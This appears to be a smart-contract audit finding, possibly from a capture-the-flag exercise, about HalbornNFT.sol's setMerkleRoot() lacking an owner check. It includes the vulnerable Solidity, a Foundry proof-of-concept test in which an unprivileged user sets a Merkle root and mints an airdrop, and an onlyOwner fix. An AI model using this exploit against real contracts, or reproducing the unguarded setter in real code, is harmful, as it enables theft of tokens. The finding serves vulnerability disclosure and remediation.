## Missing admin role management in `HalbornNFT.sol#setMerkleRoot()` function.

#### Vulnerability of Details

The `HalbornNFT.sol#setMerkleRoot()` function sets a Merkle Root to perform Merkle proof verification.
```solidity
    function setMerkleRoot(bytes32 merkleRoot_) public {
        merkleRoot = merkleRoot_;
    }
```
Based on the Merkle Root established here, the protocol gives Airdrops to permitted users by using `HalbornNFT.sol#mintAirdrops()`.

```solidity
    function mintAirdrops(uint256 id, bytes32[] calldata merkleProof) external {
        // require(_exists(id), "Token already minted");  <--- remove for testing as error occurred here

        bytes32 node = keccak256(abi.encodePacked(msg.sender, id));
        bool isValidProof = MerkleProofUpgradeable.verifyCalldata(
            merkleProof,
            merkleRoot,
            node
        );
        require(isValidProof, "Invalid proof.");

        _safeMint(msg.sender, id, "");
    }
```

However, as you can see, `HalbornNFT.sol#setMerkleRoot()` does not check whether the caller is the owner of the `HalbornNFT` contract.

As a result, the attacker can reset the contract's Merkle Root without any restrictions and receive the airdrop as desired.

#### Proof of Concept

- The attacker creates the root by specifying a `tokenId`.
- The attacker sets the contract's merkle root by calling `HalbornNFT.sol#setMerkleRoot()`.
- Then, the attacker receives the airdrop by providing the corresponding proof data to the `HalbornNFT.sol#mintAirdrops()` function.

```solidity
    function test_setMerkleProofWithoutPermission() public {
        bytes32[] memory data = new bytes32[](2);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(16)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        bytes32 root = m.getRoot(data);

        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);

        vm.startPrank(ALICE);
        nft.setMerkleRoot(root);
        nft.mintAirdrops(uint256(16), ALICE_PROOF_1);
        assertEq(nft.ownerOf(16), ALICE);
        vm.stopPrank();
    }
```

#### Recommendation
It is recommended to implement the admin role management
```solidity
--- function setMerkleRoot(bytes32 merkleRoot_) public {
+++ function setMerkleRoot(bytes32 merkleRoot_) public onlyOwner {
        merkleRoot = merkleRoot_;
    }
```